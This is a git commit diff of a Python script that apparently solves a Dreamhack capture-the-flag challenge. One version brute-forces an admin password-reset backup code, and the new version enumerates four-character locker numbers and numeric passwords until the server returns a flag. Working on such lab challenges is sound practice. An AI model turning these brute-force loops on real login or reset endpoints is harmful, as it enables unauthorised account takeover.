3a3964030008d0899f248447f9613fdd06f69d1c
Brian <hibrian827@gmail.com>
2023-09-04 21:06:15 +0900

    solving prob

--- Dreamhack/main.py
+++ Dreamhack/main.py
@@ -1,21 +1,32 @@
 import requests
+import string
 
-port = 19688
+port = 24314
 url_index = f"http://host3.dreamhack.games:{port}/"
-url_pw = url_index + "forgot_password"
-url_login = url_index + ""
-url_admin = url_index + "admin"
 
-backupCode = 0
+alphanumeric = string.ascii_lowercase + string.digits
 
-for i in range(100) :
-  backupCode = i
-  param = {
-    "userid" : "admin",
-    "newpassword" : "admin",
-    "backupCode" : backupCode
-  }
-  r = requests.post(url_pw, data = param)
-  if "Success" in r.text : break
-
-print(1)
+for l1 in alphanumeric:
+  for l2 in alphanumeric:
+    for l3 in alphanumeric:
+      for l4 in alphanumeric:
+        locker_num = l1 + l2 + l3 + l4
+        # if locker_num < "aaid" :
+        #   continue
+        print(locker_num)
+        param = {
+            "locker_num" : locker_num,
+            "password" : 100
+          }
+        r = requests.post(url_index, data = param)
+        if "Good" in r.text :
+          for password in range(100, 200) :
+            param = {
+              "locker_num" : locker_num,
+              "password" : password
+            }
+            r = requests.post(url_index, data = param)
+            if "FLAG" in r.text :
+              print(r.text)
+              break
+          break
